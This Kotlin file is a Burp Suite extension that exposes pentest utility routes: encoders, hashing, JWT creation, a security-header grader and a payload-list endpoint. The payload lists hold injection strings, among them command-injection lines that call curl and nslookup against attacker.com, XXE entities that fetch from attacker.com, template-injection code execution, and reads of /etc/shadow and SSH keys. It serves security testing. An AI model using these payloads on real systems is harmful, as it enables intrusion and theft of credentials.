package com.reburp.routes

import burp.api.montoya.MontoyaApi
import burp.api.montoya.http.message.responses.HttpResponse
import burp.api.montoya.utilities.Base64DecodingOptions
import burp.api.montoya.utilities.Base64EncodingOptions
import burp.api.montoya.utilities.CompressionType
import burp.api.montoya.utilities.DigestAlgorithm
import burp.api.montoya.utilities.HtmlEncoding
import burp.api.montoya.utilities.URLEncoding
import com.reburp.*
import io.ktor.http.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*

fun Routing.utilityRoutes(api: MontoyaApi) {
    route("/api/utils") {

        post("/url/encode") {
            val req = runCatching { call.receive<StringInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            call.respond(StringResult(api.utilities().urlUtils().encode(req.value)))
        }

        post("/url/decode") {
            val req = runCatching { call.receive<StringInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            runCatching {
                call.respond(StringResult(api.utilities().urlUtils().decode(req.value)))
            }.onFailure { call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Error")) }
        }

        post("/url/encode-mode") {
            val req = runCatching { call.receive<UrlEncodeInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("Invalid request body: ${it.message}"))
            }
            val encoding = runCatching { URLEncoding.valueOf(req.encoding.trim().uppercase()) }.getOrElse {
                return@post call.respond(
                    HttpStatusCode.BadRequest,
                    ErrorResponse("Invalid 'encoding': '${req.encoding}'. Allowed values: ${URLEncoding.values().joinToString(", ") { it.name }}")
                )
            }
            call.respond(StringResult(api.utilities().urlUtils().encode(req.value, encoding)))
        }

        post("/base64/encode") {
            val req = runCatching { call.receive<StringInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            call.respond(StringResult(api.utilities().base64Utils().encodeToString(req.value)))
        }

        post("/base64/decode") {
            val req = runCatching { call.receive<StringInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            runCatching {
                call.respond(StringResult(api.utilities().base64Utils().decode(req.value).toString()))
            }.onFailure { call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Error")) }
        }

        post("/base64/encode-options") {
            val req = runCatching { call.receive<Base64EncodeInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("Invalid request body: ${it.message}"))
            }
            val opts = buildList {
                if (req.url_safe) add(Base64EncodingOptions.URL)
                if (req.no_padding) add(Base64EncodingOptions.NO_PADDING)
            }.toTypedArray()
            val result = api.utilities().base64Utils().encodeToString(req.value, *opts)
            call.respond(StringResult(result))
        }

        post("/base64/decode-options") {
            val req = runCatching { call.receive<Base64DecodeInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("Invalid request body: ${it.message}"))
            }
            runCatching {
                val result = if (req.url_safe) {
                    api.utilities().base64Utils().decode(req.value, Base64DecodingOptions.URL).toString()
                } else {
                    api.utilities().base64Utils().decode(req.value).toString()
                }
                call.respond(StringResult(result))
            }.onFailure { call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Error")) }
        }

        post("/html/encode") {
            val req = runCatching { call.receive<HtmlEncodeInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("Invalid request body: ${it.message}"))
            }
            val encoding = runCatching { HtmlEncoding.valueOf(req.encoding.trim().uppercase()) }.getOrElse {
                return@post call.respond(
                    HttpStatusCode.BadRequest,
                    ErrorResponse("Invalid 'encoding': '${req.encoding}'. Allowed values: ${HtmlEncoding.values().joinToString(", ") { it.name }}")
                )
            }
            call.respond(StringResult(api.utilities().htmlUtils().encode(req.value, encoding)))
        }

        post("/html/decode") {
            val req = runCatching { call.receive<StringInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            call.respond(StringResult(api.utilities().htmlUtils().decode(req.value)))
        }

        post("/string/to-hex") {
            val req = runCatching { call.receive<StringInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            call.respond(StringResult(api.utilities().stringUtils().convertAsciiToHexString(req.value)))
        }

        post("/string/from-hex") {
            val req = runCatching { call.receive<StringInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            runCatching {
                call.respond(StringResult(api.utilities().stringUtils().convertHexStringToAscii(req.value)))
            }.onFailure { call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Error")) }
        }

        post("/hash") {
            val req = runCatching { call.receive<HashInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            runCatching {
                call.respond(StringResult(computeHash(req.algorithm, req.value)))
            }.onFailure { call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Unknown algorithm")) }
        }

        post("/digest") {
            val req = runCatching { call.receive<DigestInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("Invalid request body: ${it.message}"))
            }
            if (req.value.isBlank()) return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("'value' is required and must not be blank"))
            val algo = runCatching { DigestAlgorithm.valueOf(req.algorithm.trim().uppercase()) }.getOrElse {
                return@post call.respond(
                    HttpStatusCode.BadRequest,
                    ErrorResponse("Invalid 'algorithm': '${req.algorithm}'. Use one of: SHA_256, SHA_512, MD5, SHA3_256, BLAKE2B_256, KECCAK_256, SHA_1, SHA_384, SHA3_512, RIPEMD_160 ... (see /openapi.json for full list)")
                )
            }
            runCatching {
                val montoyaBytes = burp.api.montoya.core.ByteArray.byteArray(req.value)
                val digestBytes = api.utilities().cryptoUtils().generateDigest(montoyaBytes, algo).getBytes()
                val hex = digestBytes.joinToString("") { "%02x".format(it) }
                call.respond(StringResult(hex))
            }.onFailure { call.respond(HttpStatusCode.InternalServerError, ErrorResponse(it.message ?: "Error")) }
        }

        post("/jwt/decode") {
            val req = runCatching { call.receive<StringInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            call.respond(StringResult(decodeJwt(req.value)))
        }

        get("/random") {
            val length = call.request.queryParameters["length"]?.toIntOrNull() ?: 16
            val charset = call.request.queryParameters["charset"] ?: "ALPHANUMERIC"
            runCatching {
                call.respond(StringResult(api.utilities().randomUtils().randomString(length, charset)))
            }.onFailure { call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Error")) }
        }

        post("/decompress") {
            val req = runCatching { call.receive<DecompressInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Bad request body"))
            }
            runCatching {
                val decoded = api.utilities().base64Utils().decode(req.base64)
                val codec = req.encoding.trim().uppercase()
                val result = if (codec == "IDENTITY" || codec == "RAW") {
                    decoded.toString()
                } else {
                    val type = CompressionType.valueOf(codec)
                    api.utilities().compressionUtils().decompress(decoded, type).toString()
                }
                call.respond(StringResult(result))
            }.onFailure { call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Error")) }
        }

        post("/compress") {
            val req = runCatching { call.receive<CompressInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("Invalid request body: ${it.message}"))
            }
            val compressionType = runCatching { CompressionType.valueOf(req.encoding.trim().uppercase()) }.getOrElse {
                return@post call.respond(
                    HttpStatusCode.BadRequest,
                    ErrorResponse("Invalid 'encoding': '${req.encoding}'. Allowed values: ${CompressionType.values().joinToString(", ") { it.name }}")
                )
            }
            runCatching {
                val inputBytes = burp.api.montoya.core.ByteArray.byteArray(req.value)
                val compressed = api.utilities().compressionUtils().compress(inputBytes, compressionType)
                val base64Result = api.utilities().base64Utils().encodeToString(compressed)
                call.respond(StringResult(base64Result))
            }.onFailure { call.respond(HttpStatusCode.InternalServerError, ErrorResponse(it.message ?: "Error")) }
        }

        post("/response/keywords") {
            val req = runCatching { call.receive<ResponseKeywordsInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("Invalid request body: ${it.message}"))
            }
            if (req.responses.size < 2) return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("'responses' must contain at least 2 items"))
            if (req.responses.size > 50) return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("'responses' exceeds maximum of 50 items"))
            if (req.keywords.isEmpty()) return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("'keywords' must not be empty"))
            runCatching {
                val analyzer = api.http().createResponseKeywordsAnalyzer(req.keywords)
                req.responses.forEach { r -> analyzer.updateWith(HttpResponse.httpResponse(r)) }
                call.respond(
                    ResponseKeywordsResult(
                        variant = analyzer.variantKeywords().toList(),
                        invariant = analyzer.invariantKeywords().toList()
                    )
                )
            }.onFailure { call.respond(HttpStatusCode.InternalServerError, ErrorResponse(it.message ?: "Error")) }
        }

        post("/response/variations") {
            val req = runCatching { call.receive<ResponseVariationsInput>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("Invalid request body: ${it.message}"))
            }
            if (req.responses.size < 2) return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("'responses' must contain at least 2 items"))
            if (req.responses.size > 50) return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse("'responses' exceeds maximum of 50 items"))
            runCatching {
                val analyzer = api.http().createResponseVariationsAnalyzer()
                req.responses.forEach { r -> analyzer.updateWith(HttpResponse.httpResponse(r)) }
                call.respond(
                    ResponseVariationsResult(
                        variant = analyzer.variantAttributes().map { it.name },
                        invariant = analyzer.invariantAttributes().map { it.name }
                    )
                )
            }.onFailure { call.respond(HttpStatusCode.InternalServerError, ErrorResponse(it.message ?: "Error")) }
        }

        // ── JWT encode (Native) ───────────────────────────────────────────────
        // Complement to /api/utils/jwt/decode - creates signed or unsigned JWT tokens.

        post("/jwt/encode") {
            val req = runCatching { call.receive<JwtEncodeRequest>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Invalid request body"))
            }
            val alg = req.algorithm.uppercase()
            if (alg !in setOf("HS256", "HS384", "HS512", "NONE")) {
                return@post call.respond(
                    HttpStatusCode.BadRequest,
                    ErrorResponse("Invalid 'algorithm': '$alg'. Allowed: HS256, HS384, HS512, none")
                )
            }
            val headerJson = req.header_json ?: """{"alg":"$alg","typ":"JWT"}"""
            val payloadJson = req.payload_json
            val enc = java.util.Base64.getUrlEncoder().withoutPadding()
            val h = enc.encodeToString(headerJson.toByteArray(Charsets.UTF_8))
            val p = enc.encodeToString(payloadJson.toByteArray(Charsets.UTF_8))
            val sigInput = "$h.$p"
            val sig = if (alg == "NONE" || req.secret.isEmpty()) "" else {
                val hmacAlg = when (alg) { "HS384" -> "HmacSHA384"; "HS512" -> "HmacSHA512"; else -> "HmacSHA256" }
                val mac = javax.crypto.Mac.getInstance(hmacAlg)
                mac.init(javax.crypto.spec.SecretKeySpec(req.secret.toByteArray(Charsets.UTF_8), hmacAlg))
                enc.encodeToString(mac.doFinal(sigInput.toByteArray(Charsets.UTF_8)))
            }
            val token = if (sig.isEmpty()) "$sigInput." else "$sigInput.$sig"
            call.respond(JwtEncodeResponse(token = token, header = headerJson, payload = payloadJson, algorithm = alg))
        }

        // ── Security header analysis (Native) ─────────────────────────────────
        // Checks a server response for common HTTP security headers and rates them.

        post("/headers/analyze") {
            val req = runCatching { call.receive<HeaderAnalysisRequest>() }.getOrElse {
                return@post call.respond(HttpStatusCode.BadRequest, ErrorResponse(it.message ?: "Invalid request body"))
            }
            val rawHeaders: Map<String, String> = when {
                req.headers != null -> req.headers
                req.raw_response != null -> req.raw_response.lines()
                    .drop(1)
                    .takeWhile { it.isNotBlank() }
                    .mapNotNull { line ->
                        val idx = line.indexOf(':')
                        if (idx > 0) line.substring(0, idx).trim() to line.substring(idx + 1).trim() else null
                    }.toMap()
                else -> return@post call.respond(
                    HttpStatusCode.BadRequest,
                    ErrorResponse("Either 'headers' (map) or 'raw_response' (string) must be provided")
                )
            }
            val normalized = rawHeaders.entries.associate { (k, v) -> k.lowercase() to v }
            val checks = analyzeSecurityHeaders(normalized)
            val score = checks.count { it.status == "present" }
            val maxScore = checks.size
            val grade = when {
                score == maxScore -> "A+"; score >= maxScore * 0.85 -> "A"
                score >= maxScore * 0.70 -> "B"; score >= maxScore * 0.55 -> "C"
                score >= maxScore * 0.40 -> "D"; else -> "F"
            }
            call.respond(HeaderAnalysisResponse(
                checks = checks, score = score, max_score = maxScore, grade = grade,
                summary = "$score/$maxScore security headers present (grade: $grade)"
            ))
        }

        // ── Common security payloads (Native) ─────────────────────────────────
        // Returns curated payload lists by vulnerability category for use in manual testing or fuzzing.

        get("/payloads") {
            val category = (call.request.queryParameters["category"] ?: "xss").lowercase()
            val payloads = SECURITY_PAYLOADS[category]
                ?: return@get call.respond(
                    HttpStatusCode.BadRequest,
                    ErrorResponse("Unknown category '$category'. Available: ${SECURITY_PAYLOADS.keys.sorted().joinToString(", ")}")
                )
            call.respond(PayloadsResponse(
                category = category,
                description = PAYLOAD_DESCRIPTIONS[category] ?: "",
                payloads = payloads,
                count = payloads.size
            ))
        }
    }
}

// ── Security header analysis helpers ──────────────────────────────────────────

private fun analyzeSecurityHeaders(headers: Map<String, String>): List<SecurityHeaderCheck> {
    val checks = mutableListOf<SecurityHeaderCheck>()

    fun check(name: String, recommend: String, validator: ((String) -> Boolean)? = null) {
        val value = headers[name.lowercase()]
        when {
            value == null -> checks.add(SecurityHeaderCheck(name, "missing", null, recommend))
            validator != null && !validator(value) -> checks.add(SecurityHeaderCheck(name, "weak", value, recommend))
            else -> checks.add(SecurityHeaderCheck(name, "present", value, ""))
        }
    }

    check("Strict-Transport-Security", "Set to: max-age=31536000; includeSubDomains; preload") { v ->
        v.contains("max-age=") && (v.substringAfter("max-age=").trimStart().takeWhile { it.isDigit() }.toLongOrNull() ?: 0L) >= 31536000
    }
    check("Content-Security-Policy", "Define a restrictive policy; avoid 'unsafe-inline' and 'unsafe-eval'") { v ->
        !v.contains("unsafe-inline") && !v.contains("unsafe-eval") && !v.contains("*")
    }
    check("X-Frame-Options", "Set to DENY or SAMEORIGIN") { v ->
        v.uppercase() in setOf("DENY", "SAMEORIGIN")
    }
    check("X-Content-Type-Options", "Set to: nosniff") { v -> v.lowercase() == "nosniff" }
    check("Referrer-Policy", "Set to: no-referrer or strict-origin-when-cross-origin") { v ->
        v.lowercase() in setOf("no-referrer", "no-referrer-when-downgrade", "strict-origin",
            "strict-origin-when-cross-origin", "same-origin")
    }
    check("Permissions-Policy", "Restrict dangerous browser features (e.g. camera=(), microphone=(), geolocation=())")
    check("Cross-Origin-Opener-Policy", "Set to: same-origin") { v ->
        v.lowercase() in setOf("same-origin", "same-origin-allow-popups")
    }
    check("Cross-Origin-Resource-Policy", "Set to: same-origin or same-site") { v ->
        v.lowercase() in setOf("same-origin", "same-site", "cross-origin")
    }

    val xXssValue = headers["x-xss-protection"]
    if (xXssValue != null) {
        val note = if (xXssValue == "0") "present (disabled - correct for modern browsers)" else "weak (non-zero value; should be '0' in modern browsers to avoid XSS filter bypass)"
        checks.add(SecurityHeaderCheck("X-XSS-Protection", if (xXssValue == "0") "present" else "weak", xXssValue, note))
    } else {
        checks.add(SecurityHeaderCheck("X-XSS-Protection", "missing", null, "Set to '0' on modern browsers; legacy systems may use '1; mode=block'"))
    }

    val cacheControl = headers["cache-control"]
    if (cacheControl != null && (cacheControl.contains("no-store") || cacheControl.contains("private"))) {
        checks.add(SecurityHeaderCheck("Cache-Control", "present", cacheControl, ""))
    } else {
        checks.add(SecurityHeaderCheck("Cache-Control", if (cacheControl != null) "weak" else "missing", cacheControl,
            "For sensitive responses: no-store, no-cache, must-revalidate"))
    }

    return checks
}

// ── Payload lists ──────────────────────────────────────────────────────────────

private val PAYLOAD_DESCRIPTIONS = mapOf(
    "xss" to "Cross-Site Scripting (XSS) probes for reflected/stored context testing",
    "sqli" to "SQL injection probes for error-based, boolean-blind, and time-based detection",
    "path_traversal" to "Directory traversal payloads for local file read attempts",
    "ssti" to "Server-Side Template Injection probes (Jinja2/Twig/Freemarker/etc.)",
    "xxe" to "XML External Entity (XXE) injection templates",
    "cmd" to "OS command injection separators and payloads",
    "open_redirect" to "Open redirect test values (inject into redirect_uri, next, url parameters)",
    "lfi" to "Local File Inclusion payloads targeting common sensitive files",
    "nosqli" to "NoSQL injection operators for MongoDB and similar databases",
    "crlf" to "CRLF / HTTP Response Splitting injection sequences"
)

private val SECURITY_PAYLOADS = mapOf(
    "xss" to listOf(
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "javascript:alert(1)",
        "';alert(1)//",
        "\"><img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "{{7*7}}",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "data:text/html,<script>alert(1)</script>",
        "<a href=javascript:alert(1)>click</a>",
        "</script><script>alert(1)</script>"
    ),
    "sqli" to listOf(
        "'", "\"", "`",
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "\" OR \"1\"=\"1", "' OR 'x'='x",
        "1; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "1 AND 1=1", "1 AND 1=2",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "admin'--", "' OR 1=1 LIMIT 1--",
        "1; DROP TABLE users--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "1 WAITFOR DELAY '0:0:5'--"
    ),
    "path_traversal" to listOf(
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2fetc%2fpasswd", "%2e%2e%2fetc%2fpasswd",
        "..%252fetc%252fpasswd",
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\Windows\\win.ini",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "....\\....\\....\\etc/passwd",
        "/proc/self/environ", "/proc/version", "/etc/issue"
    ),
    "ssti" to listOf(
        "{{7*7}}", "\${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self}}", "{{request}}",
        "{{7*'7'}}", "{{'7'*7}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "\${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}",
        "*{7*7}", "@{7*7}",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
    ),
    "xxe" to listOf(
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/ssrf\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo/>",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><test>&xxe;</test>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\">]><foo>&xxe;</foo>"
    ),
    "cmd" to listOf(
        "; id", "| id", "& id", "&& id", "|| id",
        "`id`", "$(id)",
        "; sleep 5", "| sleep 5", "& ping -c 5 127.0.0.1",
        "'; id; echo '",
        "\"; id; echo \"",
        "%0aid", "%0a%0did",
        ";cat /etc/passwd", "| cat /etc/passwd",
        "1; nslookup attacker.com", "1 | curl http://attacker.com"
    ),
    "open_redirect" to listOf(
        "//attacker.com", "//attacker.com/path",
        "https://attacker.com", "http://attacker.com",
        "/\\attacker.com", "///attacker.com",
        "https:attacker.com",
        "%2f%2fattacker.com", "%5c%5cattacker.com",
        "javascript:alert(1)",
        "data:text/html,<script>document.location='https://attacker.com'</script>",
        "/%09/attacker.com", "/%0d%0aLocation:https://attacker.com"
    ),
    "lfi" to listOf(
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/issue",
        "/proc/self/environ", "/proc/version",
        "/var/log/apache2/access.log", "/var/log/nginx/access.log",
        "/etc/mysql/my.cnf", "/etc/php.ini",
        "/home/user/.ssh/id_rsa", "/root/.ssh/id_rsa",
        "C:/Windows/win.ini", "C:/boot.ini",
        "/var/mail/root", "/usr/local/etc/php.ini"
    ),
    "nosqli" to listOf(
        "' || '1'=='1", "\" || \"1\"==\"1",
        "{ \"\$gt\": \"\" }", "{ \"\$ne\": null }",
        "{ \"\$where\": \"1==1\" }",
        "{ \"\$regex\": \".*\" }",
        "admin\",\"\$gt\":\"", "'; return true; var a='",
        "true, \$where: '1 == 1'",
        "a]; return true; //",
        "{ \"\$or\": [ {\"a\": \"a\"}, {\"a\": \"a\"} ] }"
    ),
    "crlf" to listOf(
        "%0d%0aHeader: injected",
        "%0aHeader: injected",
        "\r\nHeader: injected",
        "\nHeader: injected",
        "%0d%0a%0d%0a<html>body injection</html>",
        "value%0d%0aSet-Cookie: session=evil",
        "%0d%0aContent-Length: 0%0d%0aHTTP/1.1 200 OK",
        "%E5%98%8A%E9%8D%8ESet-Cookie: crlftest=1"
    )
)
